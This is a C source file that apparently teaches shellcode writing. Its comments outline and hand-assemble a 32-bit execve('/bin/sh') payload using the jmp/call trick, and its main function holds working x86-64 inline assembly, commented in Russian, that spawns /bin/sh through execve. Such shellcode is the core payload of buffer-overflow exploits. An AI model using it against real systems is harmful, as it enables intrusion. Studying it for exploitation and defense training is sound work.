// a) Have the null terminated string "/bin/sh" somewhere in memory.
// b) Have the address of the string "/bin/sh" somewhere in memory
//    followed by a null long word.
// c) Copy 0xb into the EAX register.
// d) Copy the address of the address of the string "/bin/sh" into the
//    EBX register.
// e) Copy the address of the string "/bin/sh" into the ECX register.
// f) Copy the address of the null long word into the EDX register.
// g) Execute the int $0x80 instruction.
// h) Copy 0x1 into the EAX register.
// i) Copy 0x0 into the EBX register.
// j) Execute the int $0x80 instruction.
// ------------------------------------------------------------------------------ x32
//     movl   string_addr,string_addr_addr
//     movb   $0x0,null_byte_addr
//     movl   $0x0,null_addr
//     movl   $0xb,%eax
//     movl   string_addr,%ebx
//     leal   string_addr,%ecx
//     leal   null_string,%edx
//     int    $0x80
//     movl   $0x1, %eax
//     movl   $0x0, %ebx
//     int    $0x80
//     /bin/sh {string goes here, we just calculate addr}
// ------------------------------------------------------------------------------- x32
        // jmp    0x2a                     # 3 bytes
        // popl   %esi                     # 1 byte
        // movl   %esi,0x8(%esi)           # 3 bytes
        // movb   $0x0,0x7(%esi)           # 4 bytes
        // movl   $0x0,0xc(%esi)           # 7 bytes
        // movl   $0xb,%eax                # 5 bytes
        // movl   %esi,%ebx                # 2 bytes
        // leal   0x8(%esi),%ecx           # 3 bytes
        // leal   0xc(%esi),%edx           # 3 bytes
        // int    $0x80                    # 2 bytes
        // movl   $0x1, %eax               # 5 bytes
        // movl   $0x0, %ebx               # 5 bytes
        // int    $0x80                    # 2 bytes
        // call   -0x2f                    # 5 bytes
        // .string \"/bin/sh\"             # 8 bytes

// gcc -g -ggdb -o shellcodeasm shellcodeasm.c

int main(void) {
    __asm__ __volatile__(
        // rdx = NULL (envp)
        "xorq   %%rdx, %%rdx\n\t"

        // Строим строку "/bin/sh\0" на стеке
        "pushq  %%rdx\n\t"                       // null terminator
        "movq   $0x68732f6e69622f, %%rax\n\t"    // "/bin/sh" в little-endian
        "pushq  %%rax\n\t"                       // теперь [rsp] = "/bin/sh\0"

        // rdi = pathname = адрес строки
        "movq   %%rsp, %%rdi\n\t"

        // Строим argv = ["/bin/sh", NULL]
        "pushq  %%rdx\n\t"                       // argv[1] = NULL
        "pushq  %%rdi\n\t"                       // argv[0] = адрес строки
        "movq   %%rsp, %%rsi\n\t"                // rsi = argv

        // execve("/bin/sh", argv, NULL)
        "movq   $59, %%rax\n\t"                  // syscall 59 = execve
        "syscall\n\t"

        // Если execve вернулся — ошибка. exit(0)
        "movq   $60, %%rax\n\t"                  // syscall 60 = exit
        "xorq   %%rdi, %%rdi\n\t"                // код возврата 0
        "syscall\n\t"
        :
        :
        : "rax", "rdi", "rsi", "rdx", "memory"
    );
    return 0;
}